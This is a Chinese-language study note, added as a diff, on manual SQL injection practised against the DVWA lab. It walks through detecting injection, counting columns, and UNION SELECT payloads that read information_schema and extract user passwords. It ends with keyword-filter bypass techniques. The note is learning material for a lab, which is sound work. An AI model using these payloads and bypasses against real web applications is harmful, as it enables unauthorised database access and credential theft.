@@ -1,0 +1,98 @@
+        					简单的SQL
+手工注入常规思路：
+1.判断是否存在注入，注入是字符型还是数字型
+2.猜解SQL查询语句中的字段数 
+3.确定显示的字段顺序 
+4.获取当前数据库 
+5.获取数据库中的表 
+6.获取表中的字段名 
+7.查询到账户的数据
+什么是sql注入：SQL注入是指攻击者通过注入恶意的SQL命令,破坏SQL查询语句的结构,从而达到执行恶意SQL语句的目的。SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对WEB服务器进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。
+1.
+判断是数字注入还是字符：输入1'和1’or   1=1来检测是数字型注入还是字符型注入。
+数字型注入
+如果是数字型注入我们可以通过简单的逻辑等式判断，构造语句?id=1 and 1=1 和 ?id=1 and 1=2 。
+这样构造的话我们来看看后台实际上SQL语句是怎么样的：
+select * from table_name where id=1 and 1=1
+select * from table_name where id=1 and 1=2
+第一个语句是永真式，所以页面回显正常，第二个为永假所以页面回显不正常
+字符型注入
+如果是字符型注入那么SQL语句我们可以用上面的语句构造吗？显然是不行的，若是按照上面的构造方法后台应该是这样的：
+select * from table_name where id='1 and 1=2'
+这样一来1 and 1=2 就变成了一个字符串，不能进行逻辑判断。
+我们可以尝试一下构造：?id=1’ and ‘1’=1’ 和 ?id=1’ and ‘1’='2，这么做的目的是什么呢？我们来看一下在后台执行的语句应该是什么样的
+select *from table_name where id ='1' and '1'='1'
+select *from table_name where id ='1' and '1'='2'
+2.
+1' order by X#,用来查询字段数
+3.
+1′ union select 1,2 #可以把1，2换成database（），version（），user（），来获取更多信息。
+4.
+1' union select database()#
+5.
+1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+group_concat这个函数。
+这个函数好啊，能将相同的行组合起来，省老事了。
+完整的语法如下：
+group_concat([distinct] 要连接的字段 [order by asc/dasc 排序字段] [Separator '分隔符'])2
+6.
+1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’表名’ 
+7.
+-1' union select user,password from users#。查询出表名后直接拿数据
+
+and和or的作用：and连接的条件是两边都满足，而or只需要满足一个
+
+留一个问题：在dvwa的low难度里面。输入'1或者1'会语句错误，而输入1后面不管多少个中文引号都可以执行成功
+那么information_schema什么意思呢？
+information_schema数据库是MySQL数据库5.0之后自带的,它提供了访问数据库元数据的方式.
+什么是元数据呢?
+元数据是关于数据的数据,如数据库名或表名,列的数据类型,或访问权限等.也就是说informaon_schema中保存着关于MySQL服务器所维护的所有其他数据库的信息.如数据库名,数据库的表,表栏的数据类型与访问权限等.在information_schema中,有多个只读表.
+那么table_name什么意思呢？
+table_name保存了字段所属的表名。
+那么column_name
+分析字段数的原因是我们之后需要用union select语句获得我们需要的敏感数据。
+table_schema
+存储数据库名的地方
+附
+limit的用法:
+limit m,n 表示从第m个记录取n条记录
+附：
+获取数据库中的所有数据库名，表名，列名，字段名常用指令
+select schema_name from information_schema.schemata   (获取数据库名)
+select table_name from information_schema.tables             (获取表名)
+select column_name from information_schemata.columns  (获取所有列名)
+version() 获取当前数据库版本,@@version_compile_os    获取当前操作系统。
+当部分语句
+如
+-1' union select version(),@@version_compile_os#
+判断数据库长度
+1' and length(database()) = X#
+
+最后附录一下，我在dvwa上面使用这条语句1’ and 1=2 union select 1,table_name from information_schema.tables where table_schema='database()'#
+一直判断错误，经过我很久很久的琢磨发现问题在于字符编码值不匹配，所以修改一下排序规则，我没学过数据库，等后面解开这个疑问吧！
+修改过后是这样1' and 1=2 union select '1',table_name COLLATE utf8_general_ci from information_schema.tables where table_schema='database()'#
+就可以查询到！
+			重点
+sql注入主要还是绕过，常见的过滤
+（1）最常用的绕过方法就是用/**/，<>，分割关键字
+sel<>ect
+sel/**/ect
+（2）或者双写绕过selectselect
+（3）或者用大小写绕过，但是过滤关键词的话一般大小写绕过是行不通的。
+（4）有时候还可以使用编码绕过
+	url编码绕过
+	16进制编码绕过
+	ASCII编码绕过
+（5）过滤逗号的话可以用join代替
+（6）过滤等号的话可以用like代替
+（7）过滤空格
+空格被过滤有以下几种方法绕过：
+1.双空格
+2./**/
+3.用括号绕过
+
+
+
+
+
+ 
